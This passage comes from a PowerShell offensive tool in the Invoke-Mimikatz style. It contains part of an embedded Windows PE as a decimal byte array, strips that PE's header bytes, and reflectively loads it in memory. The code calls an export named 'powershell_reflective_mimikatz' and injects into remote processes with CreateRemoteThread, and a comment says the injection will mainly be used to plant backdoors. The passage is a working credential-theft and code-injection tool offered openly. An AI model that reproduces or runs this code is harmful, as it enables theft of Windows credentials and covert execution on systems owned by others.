,95,110,101,119,95,109,111,100,101,0,1,0,95,95,112,95,95,99,111,109,109,111,100,101,0,0,52,0,95,105,110,105,116,105,97,108,105,122,101,95,111,110,101,120,105,116,95,116,97,98,108,101,0,0,60,0,95,114,101,103,105,115,116,101,114,95,111,110,101,120,105,116,95,102,117,110,99,116,105,111,110,0,30,0,95,99,114,116,95,97,116,101,120,105,116,0,103,0,116,101,114,109,105,110,97,116,101,0,97,112,105,45,109,115,45,119,105,110,45,99,114,116,45,114,117,110,116,105,109,101,45,108,49,45,49,45,48,46,100,108,108,0,97,112,105,45,109,115,45,119,105,110,45,99,114,116,45,115,116,100,105,111,45,108,49,45,49,45,48,46,100,108,108,0,97,112,105,45,109,115,45,119,105,110,45,99,114,116,45,117,116,105,108,105,116,121,45,108,49,45,49,45,48,46,100,108,108,0,97,112,105,45,109,115,45,119,105,110,45,99,114,116,45,115,116,114,105,110,103,45,108,49,45,49,45,48,46,100,108,108,0,0,97,112,105,45,109,115,45,119,105,110,45,99,114,116,45,116,105,109,101,45,108,49,45,49,45,48,46,100,108,108,0,0,97,112,105,45,109,115,45,119,105,110,45,99,114,116,45,104,101,97,112,45,108,49,45,49,45,48,46,100,108,108,0,0,97,112,105,45,109,115,45,119,105,110,45,99,114,116,45,99,111,110,118,101,114,116,45,108,49,45,49,45,48,46,100,108,108,0,97,112,105,45,109,115,45,119,105,110,45,99,114,116,45,109,97,116,104,45,108,49,45,49,45,48,46,100,108,108,0,0,97,112,105,45,109,115,45,119,105,110,45,99,114,116,45,108,111,99,97,108,101,45,108,49,45,49,45,48,46,100,108,108,0,0,192,5,85,110,104,97,110,100,108,101,100,69,120,99,101,112,116,105,111,110,70,105,108,116,101,114,0,0,127,5,83,101,116,85,110,104,97,110,100,108,101,100,69,120,99,101,112,116,105,111,110,70,105,108,116,101,114,0,158,5,84,101,114,109,105,110,97,116,101,80,114,111,99,101,115,115,0,0,140,3,73,115,80,114,111,99,101,115,115,111,114,70,101,97,116,117,114,101,80,114,101,115,101,110,116,0,82,4,81,117,101,114,121,80,101,114,102,111,114,109,97,110,99,101,67,111,117,110,116,101,114,0,37,2,71,101,116,67,117,114,114,101,110,116,84,104,114,101,97,100,73,100,0,0,243,2,71,101,116,83,121,115,116,101,109,84,105,109,101,65,115,70,105,108,101,84,105,109,101,0,111,3,73,110,105,116,105,97,108,105,122,101,83,76,105,115,116,72,101,97,100,0,133,3,73,115,68,101,98,117,103,103,101,114,80,114,101,115,101,110,116,0,129,2,71,101,116,77,111,100,117,108,101,72,97,110,100,108,101,87,0,0,60,0,109,101,109,99,112,121,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,205,93,32,210,102,212,255,255,50,162,223,45,153,43,0,0,255,255,255,255,1,0,0,0,1,0,0,0,2,0,0,0,47,32,0,0,0,0,0,0,0,248,0,0,0,0,0,0,1,0,0,0,0,0,0,0,76,0,79,0,71,0,58,0,67,0,58,0,92,0,85,0,115,0,101,0,114,0,115,0,92,0,80,0,117,0,98,0,108,0,105,0,99,0,92,0,108,0,108,0,108,0,108,0,108,0,111,0,103,0,0,0,76,0,79,0,71,0,58,0,67,0,58,0,92,0,85,0,115,0,101,0,114,0,115,0,92,0,80,0,117,0,98,0,108,0,105,0,99,0,92,0,77,0,121,0,76,0,111,0,103,0,0,0,0,0,0,0,67,0,58,0,92,0,85,0,115,0,101,0,114,0,115,0,92,0,80,0,117,0,98,0,108,0,105,0,99,0,92,0,37,0,120,0,0,0,0,0,67,0,58,0,92,0,85,0,115,0,101,0,114,0,115,0,92,0,80,0,117,0,98,0,108,0,105,0,99,0,92,0,99,0,111,0,110,0,116,0,97,0,105,0,110,0,0,0,67,0,58,0,92,0,85,0,115,0,101,0,114,0,115,0,92,0,80,0,117,0,98,0,108,0,105,0,99,0,92,0,77,0,121,0,76,0,111,0,103,0,46,0,98,0,108,0,102,0,0,0,0,0,0,0,67,0,58,0,92,0,85,0,115,0,101,0,114,0,115,0,92,0,80,0,117,0,98,0,108,0,105,0,99,0,92,0,108,0,108,0,108,0,108,0,108,0,111,0,103,0,46,0,98,0,108,0,102,0,0,0,255,255,255,255,255,255,255,255,56,68,0,64,1,0,0,0,0,0,0,0,0,0,0,0,46,63,65,86,98,97,100,95,97,108,108,111,99,64,115,116,100,64,64,0,0,0,0,0,56,68,0,64,1,0,0,0,0,0,0,0,0,0,0,0,46,63,65,86,101,120,99,101,112,116,105,111,110,64,115,116,100,64,64,0,0,0,0,0,56,68,0,64,1,0,0,0,0,0,0,0,0,0,0,0,46,63,65,86,98,97,100,95,97,114,114,97,121,95,110,101,119,95,108,101,110,103,116,104,64,115,116,100,64,64,0,0,56,68,0,64,1,0,0,0,0,0,0,0,0,0,0,0,46,63,65,86,116,121,112,101,95,105,110,102,111,64,64,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,16,0,0,169,16,0,0,240,80,0,0,176,16,0,0,162,17,0,0,4,81,0,0,192,17,0,0,21,18,0,0,28,81,0,0,32,18,0,0,86,19,0,0,40,81,0,0,96,19,0,0,233,19,0,0,56,81,0,0,240,19,0,0,11,20,0,0,80,81,0,0,11,20,0,0,127,20,0,0,100,81,0,0,127,20,0,0,210,20,0,0,124,81,0,0,210,20,0,0,242,20,0,0,144,81,0,0,242,20,0,0,44,21,0,0,160,81,0,0,48,21,0,0,120,22,0,0,180,81,0,0,128,22,0,0,147,24,0,0,204,81,0,0,160,24,0,0,80,25,0,0,228,81,0,0,80,25,0,0,158,26,0,0,244,81,0,0,158,26,0,0,71,28,0,0,20,82,0,0,71,28,0,0,241,29,0,0,52,82,0,0,241,29,0,0,13,30,0,0,68,82,0,0,13,30,0,0,25,30,0,0,100,82,0,0,32,30,0,0,6,39,0,0,116,82,0,0,16,39,0,0,49,41,0,0,152,82,0,0,80,41,0,0,110,41,0,0,176,82,0,0,112,41,0,0,172,41,0,0,180,82,0,0,172,41,0,0,224,41,0,0,180,82,0,0,224,41,0,0,178,42,0,0,188,82,0,0,180,42,0,0,37,43,0,0,196,82,0,0,40,43,0,0,222,43,0,0,180,82,0,0,224,43,0,0,240,43,0,0,208,82,0,0,240,43,0,0,9,44,0,0,208,82,0,0,12,44,0,0,136,45,0,0,216,82,0,0,136,45,0,0,154,45,0,0,208,82,0,0,156,45,0,0,216,45,0,0,180,82,0,0,248,45,0,0,52,46,0,0,180,82,0,0,84,46,0,0,134,46,0,0,180,82,0,0,156,46,0,0,222,46,0,0,24,83,0,0,224,46,0,0,0,47,0,0,36,83,0,0,0,47,0,0,32,47,0,0,36,83,0,0,52,47,0,0,109,47,0,0,208,82,0,0,112,47,0,0,185,47,0,0,180,82,0,0,188,47,0,0,71,48,0,0,180,82,0,0,72,48,0,0,224,48,0,0,44,83,0,0,224,48,0,0,4,49,0,0,180,82,0,0,4,49,0,0,45,49,0,0,180,82,0,0,48,49,0,0,106,49,0,0,180,82,0,0,108,49,0,0,131,49,0,0,208,82,0,0,132,49,0,0,48,50,0,0,84,83,0,0,100,50,0,0,127,50,0,0,208,82,0,0,164,50,0,0,239,51,0,0,96,83,0,0,248,51,0,0,74,52,0,0,208,82,0,0,92,52,0,0,183,52,0,0,24,83,0,0,184,52,0,0,244,52,0,0,24,83,0,0,244,52,0,0,48,53,0,0,24,83,0,0,56,53,0,0,99,53,0,0,180,82,0,0,100,53,0,0,5,55,0,0,112,83,0,0,236,55,0,0,9,56,0,0,208,82,0,0,12,56,0,0,103,56,0,0,140,83,0,0,128,56,0,0,130,56,0,0,128,83,0,0,160,56,0,0,166,56,0,0,136,83,0,0,166,56,0,0,196,56,0,0,16,83,0,0,196,56,0,0,220,56,0,0,76,83,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,24,0,0,0,24,0,0,128,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,1,0,0,0,48,0,0,128,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,9,4,0,0,72,0,0,0,96,128,1,0,125,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,60,63,120,109,108,32,118,101,114,115,105,111,110,61,39,49,46,48,39,32,101,110,99,111,100,105,110,103,61,39,85,84,70,45,56,39,32,115,116,97,110,100,97,108,111,110,101,61,39,121,101,115,39,63,62,13,10,60,97,115,115,101,109,98,108,121,32,120,109,108,110,115,61,39,117,114,110,58,115,99,104,101,109,97,115,45,109,105,99,114,111,115,111,102,116,45,99,111,109,58,97,115,109,46,118,49,39,32,109,97,110,105,102,101,115,116,86,101,114,115,105,111,110,61,39,49,46,48,39,62,13,10,32,32,60,116,114,117,115,116,73,110,102,111,32,120,109,108,110,115,61,34,117,114,110,58,115,99,104,101,109,97,115,45,109,105,99,114,111,115,111,102,116,45,99,111,109,58,97,115,109,46,118,51,34,62,13,10,32,32,32,32,60,115,101,99,117,114,105,116,121,62,13,10,32,32,32,32,32,32,60,114,101,113,117,101,115,116,101,100,80,114,105,118,105,108,101,103,101,115,62,13,10,32,32,32,32,32,32,32,32,60,114,101,113,117,101,115,116,101,100,69,120,101,99,117,116,105,111,110,76,101,118,101,108,32,108,101,118,101,108,61,39,97,115,73,110,118,111,107,101,114,39,32,117,105,65,99,99,101,115,115,61,39,102,97,108,115,101,39,32,47,62,13,10,32,32,32,32,32,32,60,47,114,101,113,117,101,115,116,101,100,80,114,105,118,105,108,101,103,101,115,62,13,10,32,32,32,32,60,47,115,101,99,117,114,105,116,121,62,13,10,32,32,60,47,116,114,117,115,116,73,110,102,111,62,13,10,60,47,97,115,115,101,109,98,108,121,62,13,10,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,64,0,0,68,0,0,0,0,163,8,163,16,163,24,163,32,163,48,163,72,163,80,163,128,163,136,163,144,163,152,163,160,163,192,163,200,163,208,163,232,163,240,163,248,163,48,164,56,164,88,170,112,170,120,170,0,171,24,171,32,171,40,171,48,171,0,0,0,96,0,0,16,0,0,0,120,161,160,161,200,161,248,161,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0)

        $PEBytes[0] = 0
        $PEBytes[1] = 0
        $PEHandle = [IntPtr]::Zero
        if ($RemoteProcHandle -eq [IntPtr]::Zero)
        {
            $PELoadedInfo = Invoke-MemoryLoadLibrary -PEBytes $PEBytes -ExeArgs $ExeArgs
        }
        else
        {
            $PELoadedInfo = Invoke-MemoryLoadLibrary -PEBytes $PEBytes -ExeArgs $ExeArgs -RemoteProcHandle $RemoteProcHandle
        }
        if ($PELoadedInfo -eq [IntPtr]::Zero)
        {
            Throw "Unable to load PE, handle returned is NULL"
        }
        
        $PEHandle = $PELoadedInfo[0]
        $RemotePEHandle = $PELoadedInfo[1] #only matters if you loaded in to a remote process
        
        
        #Check if EXE or DLL. If EXE, the entry point was already called and we can now return. If DLL, call user function.
        $PEInfo = Get-PEDetailedInfo -PEHandle $PEHandle -Win32Types $Win32Types -Win32Constants $Win32Constants
        if (($PEInfo.FileType -ieq "DLL") -and ($RemoteProcHandle -eq [IntPtr]::Zero))
        {
            #########################################
            ### YOUR CODE GOES HERE
            #########################################
                    Write-Verbose "Calling function with WString return type"
                    [IntPtr]$WStringFuncAddr = Get-MemoryProcAddress -PEHandle $PEHandle -FunctionName "powershell_reflective_mimikatz"
                    if ($WStringFuncAddr -eq [IntPtr]::Zero)
                    {
                        Throw "Couldn't find function address."
                    }
                    $WStringFuncDelegate = Get-DelegateType @([IntPtr]) ([IntPtr])
                    $WStringFunc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WStringFuncAddr, $WStringFuncDelegate)
                    $WStringInput = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni($ExeArgs)
                    [IntPtr]$OutputPtr = $WStringFunc.Invoke($WStringInput)
                    [System.Runtime.InteropServices.Marshal]::FreeHGlobal($WStringInput)
                    if ($OutputPtr -eq [IntPtr]::Zero)
                    {
                        Throw "Unable to get output, Output Ptr is NULL"
                    }
                    else
                    {
                        $Output = [System.Runtime.InteropServices.Marshal]::PtrToStringUni($OutputPtr)
                        Write-Output $Output
                        $Win32Functions.LocalFree.Invoke($OutputPtr);
                    }
            #########################################
            ### END OF YOUR CODE
            #########################################
        }
        #For remote DLL injection, call a void function which takes no parameters
        elseif (($PEInfo.FileType -ieq "DLL") -and ($RemoteProcHandle -ne [IntPtr]::Zero))
        {
            $VoidFuncAddr = Get-MemoryProcAddress -PEHandle $PEHandle -FunctionName "VoidFunc"
            if (($VoidFuncAddr -eq $null) -or ($VoidFuncAddr -eq [IntPtr]::Zero))
            {
                Throw "VoidFunc couldn't be found in the DLL"
            }
            
            $VoidFuncAddr = Sub-SignedIntAsUnsigned $VoidFuncAddr $PEHandle
            $VoidFuncAddr = Add-SignedIntAsUnsigned $VoidFuncAddr $RemotePEHandle
            
            #Create the remote thread, don't wait for it to return.. This will probably mainly be used to plant backdoors
            $RThreadHandle = Invoke-CreateRemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $VoidFuncAddr -Win32Functions $Win32Functions
        }
        
        #Don't free a library if it is injected in a remote process
        if ($RemoteProcHandle -eq [IntPtr]::Zero)
        {
            Invoke-MemoryFreeLibrary -PEHandle $PEHandle
        }
        else
        {
            #Just delete the memory allocated in PowerShell to build the PE before injecting to remote process
            $Success = $Win32Functions.VirtualFree.Invoke($PEHandle, [UInt64]0, $Win32Constants.MEM_RELEASE)
            if ($Success -eq $false)
            {
                Write-Warning "Unable to call VirtualFree on the PE's memory. Continuing anyways." -WarningAction Continue
            }
        }
        
        Write-Verbose "Done!"
    }

    Main
}

#Main function to either run the script locally or remotely
Function Main
{
    if (($PSCmdlet.MyInvocation.BoundParameters["Debug"] -ne $null) -and $PSCmdlet.MyInvocation.BoundParameters["Debug"].IsPresent)
    {
        $DebugPreference  = "Continue"
    }
    
    Write-Verbose "PowerShell ProcessID: $PID"

    [System.IO.Directory]::SetCurrentDirectory($pwd)

    $PEBytes64 = ''

    $PEBytes32 = ''
    Invoke-Command -ScriptBlock $RemoteScriptBlock -ArgumentList @($PEBytes64, $PEBytes32, "Void", 0, "", $Command)
}
Main;
}